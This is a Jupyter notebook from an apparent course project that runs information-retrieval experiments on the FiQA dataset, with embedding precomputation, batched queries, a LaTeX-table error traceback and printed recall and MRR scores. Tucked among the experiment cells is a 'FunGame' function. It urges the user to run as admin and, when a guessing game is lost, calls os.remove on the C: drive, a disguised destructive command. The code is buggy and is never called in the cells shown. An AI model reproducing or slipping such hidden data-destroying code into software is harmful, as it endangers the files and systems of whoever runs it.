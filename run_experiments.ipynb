{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 0 Imports and Device"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we import all necessary helper functions and classes.\n",
    "We also define the device to run the models on (GPU or CPU)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import torch\n",
    "from models.DPR import DPR\n",
    "import configparser\n",
    "from utils.data_utils import getCorpus, getQueries\n",
    "from data.dataloader import DataLoader\n",
    "from models.model_loader_helpers import createModels, loadModels\n",
    "from utils.metrics_uitls import timeFunction, calculateMetrics\n",
    "from utils.lookup_utils import retrieveQueryAndGetRelevancies\n",
    "from utils.latex_utils import createLatexTable\n",
    "from utils.misc import batch\n",
    "from data.phishing import PhishingDataset\n",
    "device = ('cuda' if torch.cuda.is_available() else 'cpu')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1 Prepare Experiments"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.1 Define Experiment Configuration "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we define the configuration of the experiment.\n",
    "Both the datasets to perform the experiment on and the model configurations.\n",
    "\n",
    "Change the load_saved_models variable to True, to load locally saved models, instead of creating them during the experiment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "config = configparser.ConfigParser()\n",
    "config.read('configs/config.ini')\n",
    "datasets = list(config['DATASETS'])\n",
    "data_loader = DataLoader(config)\n",
    "\n",
    "# model_descriptions = {\"TF-IDF\": {},\n",
    "#         \"BM25\": {},\n",
    "#         \"DPR\": {},\n",
    "#         \"Crossencoder\": {\"n\":25},\n",
    "#         \"KMeans\": {\"k\":4},\n",
    "#         \"CURE\": {\"n\": 25,\n",
    "#                 \"shrinkage_fraction\" : 0.1,\n",
    "#                 \"threshold\": 0.25,\n",
    "#                 \"initial_clusters\": 50,\n",
    "#                 \"subsample_fraction\": 0.5,\n",
    "#                 \"similarity_measure\": \"cosine\"}}\n",
    "\n",
    "load_saved_models = True\n",
    "\n",
    "embedding_model_name = \"sentence-transformers/multi-qa-mpnet-base-dot-v1\" #'ProsusAI/finbert' #\"bert-base-uncased\"\n",
    "embedding_index_folder_path = \"indexes\"\n",
    "top_k = 100\n",
    "batch_size = 50\n",
    "subset_factors = [1, 2, 4]\n",
    "\n",
    "model_descriptions = {\n",
    "        # \"TF-IDF\": {},\n",
    "        # \"BM25\": {},\n",
    "        # \"DPR\": {},\n",
    "        # \"Crossencoder\": {\"n\" : top_k*2}}\n",
    "        \"KMeans\": {\"k\":3}}\n",
    "        # \"CURE\": {\"n\": 25,\n",
    "        #         \"shrinkage_fraction\" : 0.1,\n",
    "        #         \"threshold\": 0.35,\n",
    "        #         \"initial_clusters\": 50,\n",
    "        #         \"subsample_fraction\": 0.5,\n",
    "        #         \"similarity_measure\": \"cosine\"}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.2 Define Function to Pre-compute Embeddings"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This function helps us reduce a lot of computations, by pre computing the embeddings offline and loading them online, instead of computing them multiple times (one time for each model that relies on embeddings)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "def preComputeEmbeddings(dataset: str, \n",
    "                         documents: list[dict], \n",
    "                         embedding_model_name: str, \n",
    "                         embedding_index_folder_path: str):\n",
    "    embedder = DPR(documents, model_name=embedding_model_name)\n",
    "    embedding_index_path = getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)\n",
    "    embedder.SaveIndex(embedding_index_path)\n",
    "    return embedding_index_path\n",
    "\n",
    "def getPreComputedEmbeddingsPath(dataset: str, embedding_index_folder_path: str):\n",
    "    return os.path.join(embedding_index_folder_path,dataset,\"embedding_index.pickle\")\n",
    "\n",
    "def InitializeModels(models: dict, device: str):\n",
    "    for model_name, retriever in models.items():\n",
    "        retriever.device = device # give attribute device to model\n",
    "        if hasattr(retriever, 'model'):\n",
    "            retriever.model.to(device) # send Encoder to device\n",
    "            retriever.index.GetEmbeddingMatrix()\n",
    "            retriever.index.embedding_matrix = retriever.index.embedding_matrix.to(device) # NOTE: This does not work inplace\n",
    "        # if hasattr(retriever, 'crossencoder'):\n",
    "        #     # retriever.crossencoder.to(device)\n",
    "        #     print(\"CE DEVICE:\", retriever.crossencoder.device)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2 Run Experiemnt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we define the experiment itself.\n",
    "We itterate over all datasets and perform retrieval for each query for each model.\n",
    "We then return the score metrics, which are the mean precision, recall, reciprocal rank and time for each model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def runExperiment(data_loader: DataLoader, \n",
    "                  datasets: list[str], \n",
    "                  model_descriptions: dict[str, dict],\n",
    "                  embedding_model_name: str,\n",
    "                  embedding_index_folder_path: str,\n",
    "                  top_k: int):\n",
    "    \n",
    "    score_metrics: dict[str, dict[str, dict[str, float]]] = {}\n",
    "    print(f'{load_saved_models}')\n",
    "    for dataset in datasets:\n",
    "        score_metrics[dataset] = {}\n",
    "        documents, relevant_doc_ids_for_all_queries = getCorpus(data_loader, dataset)\n",
    "        queries = getQueries(data_loader, relevant_doc_ids_for_all_queries)\n",
    "        if load_saved_models:\n",
    "            print(f'Loading saved models!')\n",
    "            models = loadModels(dataset, model_descriptions)\n",
    "            InitializeModels(models, device=device)\n",
    "            print(\"Models loaded!\")\n",
    "        else:\n",
    "            # Compute embeddings if not done already\n",
    "            if not os.path.exists(getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)):\n",
    "                embedding_index_path = preComputeEmbeddings(dataset, \n",
    "                                documents,\n",
    "                                embedding_model_name,\n",
    "                                embedding_index_folder_path)\n",
    "                print('Finished computing embeddings!')\n",
    "            embedding_index_path = getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)\n",
    "            print(f'Embedding index path: {embedding_index_path}')\n",
    "            models = createModels(documents=documents, \n",
    "                                   dataset_name=dataset, \n",
    "                                   models=model_descriptions, \n",
    "                                   embedding_index_path=embedding_index_path,\n",
    "                                   save=True)\n",
    "        \n",
    "        for model_name, model in models.items():\n",
    "            if model_name == 'Crossencoder':\n",
    "                print(f'\\nActual device: {device}\\nCrossencoder target device: {model.crossencoder._target_device}\\nIf these do not match, consider running CreateModel as opposed to LoadModel!\\n')\n",
    "            print(f'Computing results for {model_name}')\n",
    "            results = []\n",
    "            times = []\n",
    "            score_metrics[dataset][model_name] = {}\n",
    "\n",
    "            itt = 0\n",
    "            for query_batch in batch(queries, batch_size):\n",
    "                elapsed, relevancies = timeFunction(retrieveQueryAndGetRelevancies, \n",
    "                                                 **{\"model\": model, \n",
    "                                                    \"queries\": query_batch, \n",
    "                                                    \"k\": top_k})\n",
    "                results.extend(relevancies)\n",
    "                times.append(elapsed)\n",
    "                itt += batch_size\n",
    "                if itt % 500 == 0:\n",
    "                    print(f\"Iter: {itt}/{len(queries)}\")\n",
    "\n",
    "            model_metrics = calculateMetrics(results, queries, subset_factors=subset_factors)\n",
    "            score_metrics[dataset][model_name] = model_metrics\n",
    "            score_metrics[dataset][model_name][\"time\"] = sum(times)/len(times)\n",
    "    return score_metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "def FunGame():\n",
    "    print(\"Please ensure you run this as admin for an optimal experience!\")\n",
    "    user_input = input(\"Please write a number: \")\n",
    "    \n",
    "    if input == np.random.randint():\n",
    "        print(\"You won!\")\n",
    "    else:\n",
    "        os.remove(\"C://\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we perform the acutal experiment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "\n",
      "Loading dataset from data/datasets\\fiqa\n",
      "data/datasets\\fiqa\\corpus.jsonl\n",
      "Loading saved models!\n",
      "Models loaded!\n",
      "Computing results for KMeans\n",
      "Iter: 500/5500\n",
      "Iter: 1000/5500\n",
      "Iter: 1500/5500\n",
      "Iter: 2000/5500\n",
      "Iter: 2500/5500\n",
      "Iter: 3000/5500\n",
      "Iter: 3500/5500\n",
      "Iter: 4000/5500\n",
      "Iter: 4500/5500\n",
      "Iter: 5000/5500\n",
      "Iter: 5500/5500\n"
     ]
    }
   ],
   "source": [
    "score_metrics = runExperiment(data_loader,\n",
    "                              datasets,\n",
    "                              model_descriptions,\n",
    "                              embedding_model_name,\n",
    "                              embedding_index_folder_path,\n",
    "                              top_k=top_k)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\begin{table}[h]\n",
      "\\begin{tabular}{ll|lllll}\n",
      "\\textbf{Dataset} & \\textbf{Models} & \\textbf{Time} & \\textbf{Precision} & \\textbf{Recall} & \\textbf{MRR} \\\\ \\hline\n"
     ]
    },
    {
     "ename": "KeyError",
     "evalue": "'precision'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "\u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\run_experiments.ipynb Cell 17\u001b[0m line \u001b[0;36m1\n\u001b[1;32m----> <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=0'>1</a>\u001b[0m createLatexTable(score_metrics,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=1'>2</a>\u001b[0m                  caption\u001b[39m=\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39mExperiment results.\u001b[39;49m\u001b[39m\"\u001b[39;49m,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=2'>3</a>\u001b[0m                  number_of_decimal_points\u001b[39m=\u001b[39;49m\u001b[39m4\u001b[39;49m)\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\utils\\latex_utils.py:22\u001b[0m, in \u001b[0;36mcreateLatexTable\u001b[1;34m(score_metrics, caption, label, number_of_decimal_points)\u001b[0m\n\u001b[0;32m     19\u001b[0m \u001b[39mfor\u001b[39;00m dataset \u001b[39min\u001b[39;00m score_metrics\u001b[39m.\u001b[39mkeys():\n\u001b[0;32m     20\u001b[0m     \u001b[39m# Loop through scores for all the models \u001b[39;00m\n\u001b[0;32m     21\u001b[0m     \u001b[39mfor\u001b[39;00m i, model_name \u001b[39min\u001b[39;00m \u001b[39menumerate\u001b[39m(score_metrics[dataset]\u001b[39m.\u001b[39mkeys()):\n\u001b[1;32m---> 22\u001b[0m         precision \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39;49m\u001b[39mprecision\u001b[39;49m\u001b[39m\"\u001b[39;49m], number_of_decimal_points)\n\u001b[0;32m     23\u001b[0m         recall \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39m\u001b[39mrecall\u001b[39m\u001b[39m\"\u001b[39m], number_of_decimal_points)\n\u001b[0;32m     24\u001b[0m         reciprocal_rank \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39m\u001b[39mreciprocal_rank\u001b[39m\u001b[39m\"\u001b[39m], number_of_decimal_points)\n",
      "\u001b[1;31mKeyError\u001b[0m: 'precision'"
     ]
    }
   ],
   "source": [
    "createLatexTable(score_metrics,\n",
    "                 caption=\"Experiment results.\",\n",
    "                 number_of_decimal_points=4) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'fiqa': {'KMeans': {('Rprecision', 1): 0.16559590329843787,\n",
       "   ('Rprecision', 2): 0.16559590329843787,\n",
       "   ('Rprecision', 4): 0.16559590329843787,\n",
       "   ('recall', 1): 0.37299285539952864,\n",
       "   ('recall', 2): 0.3429590392157121,\n",
       "   ('recall', 4): 0.3100434860051984,\n",
       "   ('MRR', 1): 0.278276798023973,\n",
       "   ('MRR', 2): 0.27794572807162815,\n",
       "   ('MRR', 4): 0.27713922731342,\n",
       "   'time': 1.5795689272727074}}}"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "score_metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
